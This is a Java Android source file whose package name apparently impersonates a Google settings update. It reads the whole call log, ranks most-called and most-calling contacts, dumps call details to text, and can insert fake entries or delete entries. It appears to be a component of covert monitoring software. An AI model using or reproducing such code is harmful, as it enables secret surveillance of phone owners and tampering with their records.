package com.setting.dl.google.googlesettingupdate.phone;


import android.annotation.SuppressLint;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.support.annotation.NonNull;

import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.u;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Set;


public class Calls {
    
    
    private final Context    context;
    private       List<Call> calls         = new ArrayList<>();
    private final String[]   CALL_LOG_COLS = new String[]{
            
            CallLog.Calls.NUMBER,
            CallLog.Calls.DATE,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION,
            CallLog.Calls._ID,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.IS_READ
    };
    
    private final static String[] CALL_COLUMNS = {
            
            CallLog.Calls._ID,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.NUMBER,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION,
            CallLog.Calls.DATE
    };
    
    
    public Calls(Context context) {
        
        this.context = context;
        getCalls();
    }
    
    public static List<com.setting.dl.google.googlesettingupdate.phone.Call> getCalls(final Context context) {
        
        if (context == null) {
            
            u.log.w("Arama kayıtları alınamıyor. context = null");
            return null;
        }
        
        @SuppressLint("MissingPermission") final Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                CALL_COLUMNS,
                null,
                null,
                CALL_COLUMNS[5] + " desc"
        
        );
        
        if (cursor == null) return null;
        
        List<com.setting.dl.google.googlesettingupdate.phone.Call> calls = new ArrayList<>();
        
        if (cursor.getCount() == 0) return calls;
        
        
        final int idColumn       = cursor.getColumnIndex(CALL_COLUMNS[0]);
        final int nameColumn     = cursor.getColumnIndex(CALL_COLUMNS[1]);
        final int numberColumn   = cursor.getColumnIndex(CALL_COLUMNS[2]);
        final int typeColumn     = cursor.getColumnIndex(CALL_COLUMNS[3]);
        final int durationColumn = cursor.getColumnIndex(CALL_COLUMNS[4]);
        final int dateColumn     = cursor.getColumnIndex(CALL_COLUMNS[5]);
        
        
        while (cursor.moveToNext()) {
            
            String name   = cursor.getString(nameColumn);
            String number = Contacts.normalizeNumber(cursor.getString(numberColumn));
            
            calls.add(
                    new com.setting.dl.google.googlesettingupdate.phone.Call(
                            cursor.getString(idColumn),
                            number,
                            cursor.getLong(dateColumn),
                            cursor.getInt(typeColumn),
                            cursor.getInt(durationColumn),
                            name
                    )
            );
        }
        
        cursor.close();
        return calls;
    }
    
    @SuppressLint("MissingPermission")
    public List<Call> getCalls() {
        
        Cursor call_log = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                CALL_LOG_COLS,
                null,
                null,
              CALL_LOG_COLS[1] + " desc");
        
        
        if (call_log != null && call_log.moveToFirst()) {
            
            
            int numberCol   = call_log.getColumnIndex(CALL_LOG_COLS[0]);
            int dateCol     = call_log.getColumnIndex(CALL_LOG_COLS[1]);
            int typeCol     = call_log.getColumnIndex(CALL_LOG_COLS[2]);
            int durationCol = call_log.getColumnIndex(CALL_LOG_COLS[3]);
            int idCol       = call_log.getColumnIndex(CALL_LOG_COLS[4]);
            int NameCol     = call_log.getColumnIndex(CALL_LOG_COLS[5]);
            int readCol     = call_log.getColumnIndex(CALL_LOG_COLS[6]);
            
            
            do {
                
                String  number   = call_log.getString(numberCol);
                String  duration = call_log.getString(durationCol);
                String  type     = call_log.getString(typeCol);
                long    date     = call_log.getLong(dateCol);
                String  id       = call_log.getString(idCol);
                String  name     = call_log.getString(NameCol);
                Boolean read     = call_log.getInt(readCol) == 1;
                
                number = Contacts.normalizeNumber(number);
                
                
                int callType = Integer.valueOf(type);
                
                switch (callType) {
                    
                    case CallLog.Calls.INCOMING_TYPE:
                        type = "Gelen Çağrı";
                        break;
                    
                    case CallLog.Calls.OUTGOING_TYPE:
                        type = "Giden Çağrı";
                        break;
                    
                    case CallLog.Calls.MISSED_TYPE:
                        type = "Cevapsız Çağrı";
                        break;
                    
                    case CallLog.Calls.REJECTED_TYPE:
                        type = "Reddedilen Çağrı";
                        break;
                    
                    case CallLog.Calls.BLOCKED_TYPE:
                        type = "Engellenen Çağrı";
                        break;
                    
                }
                
                
                if (name == null) {
                    
                    name = Contacts.getContactNameWithNumber(context, number);
                    if (name.equals("Kayıtlı değil")) name = number;
                }
                
                //Log.i("Calllogs", number);
                
                calls.add(new Call(
                        number,
                        date,
                        duration,
                        type,
                        id,
                        name,
                        callType,
                        read));
                
            }
            while (call_log.moveToNext());
            
            call_log.close();
        }
        
        return calls;
    }
    
    public final String enCokArananlar() {
        
        Map<String, Integer> arananNumaralar = new HashMap<>();
        
        for (int i = 0; i < calls.size(); i++) {
            
            Call call = calls.get(i);
            
            if(call.intType != CallLog.Calls.OUTGOING_TYPE) continue;
            
            if (!arananNumaralar.containsKey(call.getNumber())) {
                
                arananNumaralar.put(call.getNumber(), 1);
                
            }
            else {
                
                int value = arananNumaralar.get(call.getNumber());
                
                arananNumaralar.remove(call.getNumber());
                
                arananNumaralar.put(call.getNumber(), ++value);
                
            }
        }
        
        
        @SuppressLint("UseSparseArrays")
        Map<Integer, String> enCokArananlar = new HashMap<>();
        
        for (Map.Entry<String, Integer> list : arananNumaralar.entrySet()) {
            
            enCokArananlar.put(list.getValue(), list.getKey());
            
        }
        
        Set<Integer> times = enCokArananlar.keySet();
        
        int[] degerler = new int[times.size()];
        
        int j = 0;
        
        for (int i : times) {
            
            degerler[j++] = i;
            
        }
        
        for (int i = 0; i < degerler.length - 1; i++) {
            
            for (int k = i + 1; k < degerler.length; k++) {
                
                if (degerler[i] < degerler[k]) {
                    
                    int temp = degerler[i];
                    degerler[i] = degerler[k];
                    degerler[k] = temp;
                }
            }
        }
        
        
        StringBuilder value = new StringBuilder();
        
        value.append("EN ÇOK ARANANLAR\n");
        
        value.append("---------------------------------\n");
        
        for (int i : degerler) {
            
            String name = Contacts.getContactNameWithNumber(context, enCokArananlar.get(i));
            
            value.append(String.format(new Locale("tr"),"%18s : %d\n", name.equals("Kayıtlı değil") ? enCokArananlar.get(i) : name, i));
            
        }
        
        return value.toString();
        
    }
    
    public final String enCokArayanlar() {
        
        Map<String, Integer> arananNumaralar = new HashMap<>();
        
        for (int i = 0; i < calls.size(); i++) {
            
            Call call = calls.get(i);
            
            if(call.intType != CallLog.Calls.INCOMING_TYPE) continue;
            
            if (!arananNumaralar.containsKey(call.getNumber())) {
                
                arananNumaralar.put(call.getNumber(), 1);
                
            }
            else {
                
                int value = arananNumaralar.get(call.getNumber());
                
                arananNumaralar.remove(call.getNumber());
                
                arananNumaralar.put(call.getNumber(), ++value);
                
            }
        }
        
        
        @SuppressLint("UseSparseArrays")
        Map<Integer, String> enCokArananlar = new HashMap<>();
        
        for (Map.Entry<String, Integer> list : arananNumaralar.entrySet()) {
            
            enCokArananlar.put(list.getValue(), list.getKey());
            
        }
        
        Set<Integer> times = enCokArananlar.keySet();
        
        int[] degerler = new int[times.size()];
        
        int j = 0;
        
        for (int i : times) {
            
            degerler[j++] = i;
            
        }
        
        for (int i = 0; i < degerler.length - 1; i++) {
            
            for (int k = i + 1; k < degerler.length; k++) {
                
                if (degerler[i] < degerler[k]) {
                    
                    int temp = degerler[i];
                    degerler[i] = degerler[k];
                    degerler[k] = temp;
                }
            }
        }
        
        
        StringBuilder value = new StringBuilder();
        
        value.append("EN ÇOK ARAYANLAR\n");
        
        value.append("---------------------------------\n");
        
        for (int i : degerler) {
            
            String name = Contacts.getContactNameWithNumber(context, enCokArananlar.get(i));
            
            value.append(String.format(new Locale("tr"),"%18s : %d\n", name.equals("Kayıtlı değil") ? enCokArananlar.get(i) : name, i));
            
        }
        
        return value.toString();
        
    }
    
    public class Call implements Comparable<Call> {
        
        String number, duration, type, id, name;
        int  intType;
        long date;
        
        
        Boolean isRead;
        
        public Call(String number, long date, String duration,
                    String type, String id, String name, int intType, Boolean isRead) {
            
            this.number = number;
            this.date = date;
            this.type = type;
            this.duration = duration;
            this.id = id;
            this.name = name;
            this.intType = intType;
            this.isRead = isRead;
        }
        
        public Boolean getRead() {return isRead;}
        
        public void setRead(Boolean read) {isRead = read;}
        
        public String getNumber() {return number;}
        
        public long getDate() {return date;}
        
        public String getDuration() {return duration;}
        
        public String getType() {return type;}
        
        public String getId() {return id;}
        
        public String getName() {return name;}
        
        public int getIntType() {return intType;}
        
        
        @Override public int compareTo(@NonNull Call o) {
    
            return Long.compare(o.date, date);
        }
    }
    
    @NonNull
    @Override
    public String toString() {
        
        
        StringBuilder value = new StringBuilder();
        
        for (Call call : calls) {
            
            value.append(String.format("%s\n", call.type));
            value.append("--------------------\n");
            value.append(String.format("Kişi      : %s\n", call.name == null ? Contacts.getContactNameWithNumber(context, call.number) : call.getName()));
            value.append(String.format("Numara    : %s\n", call.getNumber()));
            value.append(String.format("Tarih     : %s\n", Time.getDate(call.getDate())));
            value.append(String.format("Süre      : %s saniye\n", call.getDuration()));
            value.append(String.format("id        : %s\n", call.getId()));
            value.append(String.format("isRead    : %s\n", call.getRead()));
            value.append("xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n");
            
        }
        
        return value.toString();
    }
    
    @SuppressLint("MissingPermission")
    public static void insertPlaceholderCall(ContentResolver contentResolver, String number, String date, String duration, int type, int isRead) {
        
        ContentValues values = new ContentValues();
        values.put(CallLog.Calls.NUMBER, number);
        values.put(CallLog.Calls.DATE, date);
        values.put(CallLog.Calls.IS_READ, isRead);
        values.put(CallLog.Calls.DURATION, duration);
        values.put(CallLog.Calls.TYPE, type);
        values.put(CallLog.Calls.NEW, 0);
        values.put(CallLog.Calls.PHONE_ACCOUNT_ID, "salla");
        //values.put(CallLog.Calls.CACHED_NAME, "");
        //values.put(CallLog.Calls.CACHED_NUMBER_TYPE, type);
        //values.put(CallLog.Calls.CACHED_NUMBER_LABEL, ""
        
        
        contentResolver.insert(CallLog.Calls.CONTENT_URI, values);
    }
    
    @SuppressLint("MissingPermission")
    public static void deleteCallWithId(ContentResolver contentResolver, String id) {
        
        contentResolver.delete(CallLog.Calls.CONTENT_URI, CallLog.Calls._ID + " =? ", new String[]{id});
        
    }
    
    public interface ICall<T> extends Contacts.MyPredicate<T> {}
    
    public List<Call> getCalls(ICall<Call> predicate) {
        
        List<Call> callList = new ArrayList<>();
        
        for (Call call : calls) {
            
            if (predicate.test(call)) {
                
                callList.add(call);
            }
        }
        
        return callList;
    }
    
    public static List<Call> getRejectedCalls(Context context) {
        
        return new Calls(context).getCalls(e -> e.getIntType() == 5);
    }
    
    public static boolean isRejected(Context context, String number, long date) {
        
        List<Call> rejectedCalls = getRejectedCalls(context);
        
        number = Contacts.normalizeNumber(number);
        
        for (Call call : rejectedCalls) {
            
            if (call.getNumber().equals(number) && (Math.abs(date - call.date) < 200)) {
                
                return true;
            }
        }
        
        return false;
    }
    
    
}
